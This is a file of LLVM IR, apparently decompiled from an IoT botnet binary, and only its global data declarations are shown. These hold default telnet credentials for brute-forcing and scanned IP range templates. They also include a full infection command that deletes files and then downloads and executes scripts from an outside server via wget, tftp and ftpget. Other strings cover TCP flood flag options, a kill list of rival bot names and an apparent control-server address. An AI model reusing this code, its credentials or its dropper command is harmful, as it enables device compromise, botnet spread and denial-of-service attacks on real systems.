source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%sockaddr = type { i32, [14 x i8] }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_80a0.4 = constant i32 -352321502
@global_var_2d00c.8 = global i32 0
@global_var_2d01c.9 = global i32* @global_var_2d00c.8
@global_var_2d5ec.16 = global i32 0
@global_var_2d010.19 = global i32 0
@global_var_10be0.23 = constant i32 -509558771
@global_var_2d620.26 = global i32 0
@global_var_2d624.27 = local_unnamed_addr global i32 0
@global_var_2d628.28 = local_unnamed_addr global i32 0
@global_var_2d280.31 = local_unnamed_addr global i32 4095
@global_var_2d27c.34 = global i32 362436
@global_var_1af0c.36 = constant [7 x i8] c"(null)\00"
@global_var_31620.38 = local_unnamed_addr global i32 0
@global_var_1af14.40 = constant [8 x i8] c"/bin/sh\00"
@global_var_1ab10.42 = constant [3 x i8] c"sh\00"
@global_var_1af1c.44 = constant [3 x i8] c"-c\00"
@global_var_1af20.47 = constant i32 -1
@global_var_1b320.49 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_1b330.51 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_2d604.55 = global i32 0
@global_var_1b33c.57 = constant [5 x i8] c"PING\00"
@global_var_1aefc.59 = constant [8 x i8] c"busybox\00"
@global_var_1af04.60 = constant i32 36
@global_var_1af08.61 = constant i32 35
@global_var_2d200.62 = global [3 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1aefc.59, i32 0, i32 0), i8* bitcast (i32* @global_var_1af04.60 to i8*), i8* bitcast (i32* @global_var_1af08.61 to i8*)]
@global_var_1aec4.64 = constant [7 x i8] c"nvalid\00"
@global_var_1aecc.65 = constant [6 x i8] c"ailed\00"
@global_var_1aed4.66 = constant [9 x i8] c"ncorrect\00"
@global_var_1aee0.67 = constant [6 x i8] c"enied\00"
@global_var_1aee8.68 = constant [5 x i8] c"rror\00"
@global_var_1aef0.69 = constant [7 x i8] c"oodbye\00"
@global_var_1aef8.70 = constant [4 x i8] c"bad\00"
@global_var_2d1e0.71 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1aec4.64, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1aecc.65, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1aed4.66, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1aee0.67, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1aee8.68, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1aef0.69, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1aef8.70, i32 0, i32 0)]
@global_var_2d60c.73 = global i32 0
@global_var_2d610.74 = local_unnamed_addr global i32 0
@global_var_3388c.76 = global i32 0
@global_var_1b344.78 = constant [6 x i8] c":>%$#\00"
@global_var_1b34c.86 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_1b35c.88 = constant [13 x i8] c"43.239.%d.%d\00"
@global_var_1b36c.90 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_1b378.92 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_1b388.94 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_1b394.96 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_1b3a4.98 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_1b3b0.100 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_1b3c0.102 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_1b3d0.104 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_1b3e0.106 = constant [13 x i8] c"77.209.%d.%d\00"
@global_var_1b3f0.108 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_1b3fc.110 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_1b40c.112 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_1b41c.114 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_1b42c.116 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_1b43c.118 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_1b44c.120 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_1b45c.122 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_1b468.124 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_1b474.126 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_1b484.128 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_1b490.130 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_1b49c.132 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_1b4a8.134 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_1b4b4.136 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_1b4c0.138 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_1b4d0.140 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_1b4e0.142 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_1b4ec.144 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_1b4fc.146 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_1b508.148 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_1b514.150 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_1b520.152 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_1b52c.154 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_1b538.156 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_1b544.158 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_1b550.160 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_1b560.162 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_1b570.164 = constant [11 x i8] c"60.0.%d.%d\00"
@global_var_1b57c.166 = constant [12 x i8] c"60.16.%d.%d\00"
@global_var_1b588.168 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_1b598.170 = constant [12 x i8] c"62.30.%d.%d\00"
@global_var_1b5a4.172 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_1b5b4.174 = constant [13 x i8] c"62.254.%d.%d\00"
@global_var_1b5c4.176 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_1b5d4.178 = constant [12 x i8] c"77.96.%d.%d\00"
@global_var_1b5e0.180 = constant [12 x i8] c"77.97.%d.%d\00"
@global_var_1b5ec.182 = constant [12 x i8] c"77.98.%d.%d\00"
@global_var_1b5f8.184 = constant [13 x i8] c"77.100.%d.%d\00"
@global_var_1b608.186 = constant [13 x i8] c"77.102.%d.%d\00"
@global_var_1b618.188 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_1b628.190 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_1b638.192 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_1b648.194 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_1b658.196 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_1b668.198 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_1b678.200 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_1b688.202 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_1b698.204 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_1b6a8.206 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_1b6b8.208 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_1b6c8.210 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_1b6d8.212 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_1b6e8.214 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_1b6f8.216 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_1b708.218 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_1b718.220 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_1b728.222 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_1b738.224 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_1b748.226 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_1b758.228 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_1b768.230 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_1b778.233 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_1b788.235 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_1b798.237 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_1b7a8.239 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_1b7b8.241 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_1b7c8.243 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_1b7d8.245 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_1b7e8.247 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_1b7f8.249 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_1b808.251 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_1b818.253 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_1b828.255 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_1b838.257 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_1b848.259 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_1b858.261 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_1b868.263 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_1b878.265 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_1b888.267 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_1b898.270 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_1b8a8.272 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_1b8b8.274 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_1b8c8.276 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_1b8d8.278 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_1b8e8.280 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_1b8f8.282 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_1b908.284 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_1b918.286 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_1b924.288 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_1b934.290 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_1b944.292 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_1b954.294 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_1b960.296 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_1b970.298 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_1b980.300 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_1b990.302 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_1b9a0.304 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_1b9b0.306 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_1b9c0.308 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_1b9d0.310 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_2d23c.312 = global i32 110
@global_var_1b9e0.315 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_33880.317 = global i32 0
@global_var_1ae48.319 = constant [15 x i8] c"/dev/netslink/\00"
@global_var_1ae58.320 = constant [6 x i8] c"/tmp/\00"
@global_var_1ae60.321 = constant [6 x i8] c"/var/\00"
@global_var_1ae68.322 = constant [6 x i8] c"/dev/\00"
@global_var_1ae70.323 = constant [10 x i8] c"/var/run/\00"
@global_var_1ae7c.324 = constant [10 x i8] c"/dev/shm/\00"
@global_var_1ae88.325 = constant [6 x i8] c"/mnt/\00"
@global_var_1ae90.326 = constant [7 x i8] c"/boot/\00"
@global_var_1ae98.327 = constant [6 x i8] c"/usr/\00"
@global_var_1aea0.328 = constant [6 x i8] c"/opt/\00"
@global_var_2d1a0.329 = global [10 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1ae48.319, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ae58.320, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ae60.321, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ae68.322, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ae70.323, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ae7c.324, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ae88.325, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ae90.326, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ae98.327, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1aea0.328, i32 0, i32 0)]
@global_var_2d1cc = external global i32
@global_var_1ae34.336 = constant [5 x i8] c"root\00"
@global_var_1ae3c.337 = constant [7 x i8] c"telnet\00"
@global_var_1ae44.338 = constant i32 0
@global_var_2d188.339 = global [6 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ae34.336, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ae34.336, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ae3c.337, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ae34.336, i32 0, i32 0), i8* bitcast (i32* @global_var_1ae44.338 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ae3c.337, i32 0, i32 0)]
@global_var_1b9ec.341 = constant [3 x i8] c"\0D\0A\00"
@global_var_2d194.343 = global [3 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ae34.336, i32 0, i32 0), i8* bitcast (i32* @global_var_1ae44.338 to i8*), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ae3c.337, i32 0, i32 0)]
@global_var_2d210.345 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1aec4.64, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1aecc.65, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1aed4.66, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1aee0.67, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1aee8.68, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1aef0.69, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1aef8.70, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1aefc.59, i32 0, i32 0), i8* bitcast (i32* @global_var_1af04.60 to i8*), i8* bitcast (i32* @global_var_1af08.61 to i8*)]
@global_var_1b9f0.348 = constant [23 x i8] c"LOGIN FOUND - %s:%s:%s\00"
@global_var_1ba08.350 = constant [5 x i8] c"sh\0D\0A\00"
@global_var_1ba10.352 = constant [8 x i8] c"shell\0D\0A\00"
@global_var_1ac3c.354 = constant [504 x i8] c"cd /tmp || cd /var/system || cd /mnt || cd /lib;rm -f /tmp/* || /var/run/* || /var/system/* || /mnt/* || /lib/*;cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.213.61/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 45.32.213.61 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 45.32.213.61; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 45.32.213.61 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *\0D\0A\00"
@global_var_2d184.355 = local_unnamed_addr global [504 x i8]* @global_var_1ac3c.354
@global_var_1ba18.357 = constant [6 x i8] c"arfgG\00"
@global_var_1ba20.358 = constant [9 x i8] c"HBiug655\00"
@global_var_1ba2c.359 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_1ba3c.360 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_1ba50.361 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_1ba64.362 = constant [12 x i8] c"GJjyur67458\00"
@global_var_1ba70.363 = constant [12 x i8] c"RYSDk747586\00"
@global_var_1ba7c.364 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_1ba88.365 = constant [10 x i8] c"KHGK7985i\00"
@global_var_1ba94.366 = constant [11 x i8] c"yuituiILYF\00"
@global_var_1baa0.367 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_1bab0.368 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_1babc.369 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_1bacc.370 = constant [9 x i8] c"ewqdcftr\00"
@global_var_1bad8.371 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_1bae8.372 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_1baf4.373 = constant [12 x i8] c"twehgbferhb\00"
@global_var_1bb00.374 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_1bb0c.375 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_1bb1c.376 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_1bb2c.377 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_1bb3c.378 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_1bb48.379 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_1bb58.380 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_1bb68.381 = constant [12 x i8] c"yteytietyue\00"
@global_var_1bb74.382 = constant [9 x i8] c"qsortEQS\00"
@global_var_1bb80.383 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_1bb90.384 = constant [4 x i8] c"std\00"
@global_var_1bb94.385 = constant [4 x i8] c"dts\00"
@global_var_1bb98.386 = constant [4 x i8] c"lsk\00"
@global_var_1bb9c.387 = constant [4 x i8] c"kek\00"
@global_var_1bba0.388 = constant [6 x i8] c"smack\00"
@global_var_1bba8.389 = constant [4 x i8] c"ily\00"
@global_var_1bbac.390 = constant [4 x i8] c"tyf\00"
@global_var_1bbb0.391 = constant [4 x i8] c"pos\00"
@global_var_1bbb4.392 = constant [6 x i8] c"cunts\00"
@global_var_1bbbc.393 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ba18.357, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1ba20.358, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1ba2c.359, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1ba3c.360, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1ba50.361, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1ba64.362, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1ba70.363, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1ba7c.364, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ba88.365, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1ba94.366, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1baa0.367, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1bab0.368, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1babc.369, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1bacc.370, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1bad8.371, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1bae8.372, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1baf4.373, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1bb00.374, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1bb0c.375, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1bb1c.376, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1bb2c.377, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1bb3c.378, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1bb48.379, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1bb58.380, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1bb68.381, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1bb74.382, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1bb80.383, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1bb90.384, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1bb94.385, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1bb98.386, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1bb9c.387, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bba0.388, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1bba8.389, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1bbac.390, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1bbb0.391, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1bbb4.392, i32 0, i32 0)]
@global_var_1bc4c.396 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_1bc68.398 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_1bc8c.403 = constant [4 x i8] c"all\00"
@global_var_1bc90.405 = constant i32 44
@global_var_1bc94.407 = constant [4 x i8] c"syn\00"
@global_var_1bc98.409 = constant [4 x i8] c"rst\00"
@global_var_1bc9c.411 = constant [4 x i8] c"fin\00"
@global_var_1bca0.413 = constant [4 x i8] c"ack\00"
@global_var_1bca4.415 = constant [4 x i8] c"psh\00"
@global_var_1bca8.417 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_1a9d0.423 = constant [5 x i8] c"mips\00"
@global_var_1a9d8.424 = constant [7 x i8] c"mipsel\00"
@global_var_1a9e0.425 = constant [4 x i8] c"sh4\00"
@global_var_1a9e4.426 = constant [4 x i8] c"x86\00"
@global_var_1a9e8.427 = constant [5 x i8] c"i686\00"
@global_var_1a9f0.428 = constant [4 x i8] c"ppc\00"
@global_var_1a9f4.429 = constant [5 x i8] c"i586\00"
@global_var_1a9fc.430 = constant [8 x i8] c"jackmy*\00"
@global_var_1aa04.431 = constant [8 x i8] c"hackmy*\00"
@global_var_1aa0c.432 = constant [5 x i8] c"arm*\00"
@global_var_1aa14.433 = constant [3 x i8] c"b1\00"
@global_var_1aa18.434 = constant [3 x i8] c"b2\00"
@global_var_1aa1c.435 = constant [3 x i8] c"b3\00"
@global_var_1aa20.436 = constant [3 x i8] c"b4\00"
@global_var_1aa24.437 = constant [3 x i8] c"b5\00"
@global_var_1aa28.438 = constant [3 x i8] c"b6\00"
@global_var_1aa2c.439 = constant [3 x i8] c"b7\00"
@global_var_1aa30.440 = constant [3 x i8] c"b8\00"
@global_var_1aa34.441 = constant [3 x i8] c"b9\00"
@global_var_1aa38.442 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_1aa4c.443 = constant [9 x i8] c"DFhxdhdf\00"
@global_var_1aa58.444 = constant [10 x i8] c"dvrHelper\00"
@global_var_1aa64.445 = constant [8 x i8] c"FDFDHFC\00"
@global_var_1aa6c.446 = constant [5 x i8] c"FEUB\00"
@global_var_1aa74.447 = constant [9 x i8] c"FTUdftui\00"
@global_var_1aa80.448 = constant [9 x i8] c"GHfjfgvj\00"
@global_var_1aa8c.449 = constant [6 x i8] c"jhUOH\00"
@global_var_1aa94.450 = constant [9 x i8] c"JIPJIPJj\00"
@global_var_1aaa0.451 = constant [10 x i8] c"JIPJuipjh\00"
@global_var_1aaac.452 = constant [10 x i8] c"kmyx86_64\00"
@global_var_1aab8.453 = constant [10 x i8] c"lolmipsel\00"
@global_var_1aac4.454 = constant [8 x i8] c"RYrydry\00"
@global_var_1aacc.455 = constant [5 x i8] c"tel*\00"
@global_var_1aad4.456 = constant [9 x i8] c"TwoFace*\00"
@global_var_1aae0.457 = constant [9 x i8] c"UYyuyioy\00"
@global_var_1aaec.458 = constant [5 x i8] c"wget\00"
@global_var_1aaf4.459 = constant [7 x i8] c"x86_64\00"
@global_var_1aafc.460 = constant [9 x i8] c"XDzdfxzf\00"
@global_var_1ab08.461 = constant [5 x i8] c"xxb*\00"
@global_var_1ab14.462 = constant i32 49
@global_var_1ab18.463 = constant i32 50
@global_var_1ab1c.464 = constant i32 51
@global_var_1ab20.465 = constant i32 52
@global_var_1ab24.466 = constant i32 53
@global_var_1ab28.467 = constant i32 54
@global_var_1ab2c.468 = constant i32 55
@global_var_1ab30.469 = constant i32 56
@global_var_1ab34.470 = constant i32 57
@global_var_1ab38.471 = constant [3 x i8] c"10\00"
@global_var_1ab3c.472 = constant [3 x i8] c"11\00"
@global_var_1ab40.473 = constant [3 x i8] c"12\00"
@global_var_1ab44.474 = constant [3 x i8] c"13\00"
@global_var_1ab48.475 = constant [3 x i8] c"14\00"
@global_var_1ab4c.476 = constant [3 x i8] c"15\00"
@global_var_1ab50.477 = constant [3 x i8] c"16\00"
@global_var_1ab54.478 = constant [3 x i8] c"17\00"
@global_var_1ab58.479 = constant [3 x i8] c"18\00"
@global_var_1ab5c.480 = constant [3 x i8] c"19\00"
@global_var_1ab60.481 = constant [3 x i8] c"20\00"
@global_var_1ab64.482 = constant [6 x i8] c"hackz\00"
@global_var_1ab6c.483 = constant [5 x i8] c"bin*\00"
@global_var_1ab74.484 = constant [5 x i8] c"gtop\00"
@global_var_1ab7c.485 = constant [5 x i8] c"ftp*\00"
@global_var_1ab84.486 = constant [6 x i8] c"tftp*\00"
@global_var_1ab8c.487 = constant [7 x i8] c"botnet\00"
@global_var_1ab94.488 = constant [8 x i8] c"swatnet\00"
@global_var_1ab9c.489 = constant [8 x i8] c"ballpit\00"
@global_var_1aba4.490 = constant [8 x i8] c"fucknet\00"
@global_var_1abac.491 = constant [9 x i8] c"cracknet\00"
@global_var_1abb8.492 = constant [8 x i8] c"weednet\00"
@global_var_1abc0.493 = constant [7 x i8] c"gaynet\00"
@global_var_1abc8.494 = constant [9 x i8] c"queernet\00"
@global_var_1abd4.495 = constant [8 x i8] c"ballnet\00"
@global_var_1abdc.496 = constant [5 x i8] c"unet\00"
@global_var_1abe4.497 = constant [7 x i8] c"yougay\00"
@global_var_1abec.498 = constant [7 x i8] c"sttftp\00"
@global_var_1abf4.499 = constant [7 x i8] c"sstftp\00"
@global_var_1abfc.500 = constant [7 x i8] c"sbtftp\00"
@global_var_1ac04.501 = constant [6 x i8] c"btftp\00"
@global_var_1ac0c.502 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_1ac18.503 = constant [6 x i8] c"bruv*\00"
@global_var_1ac20.504 = constant [5 x i8] c"IoT*\00"
@global_var_1ac28.505 = constant [17 x i8] c"185.158.113.30:7\00"
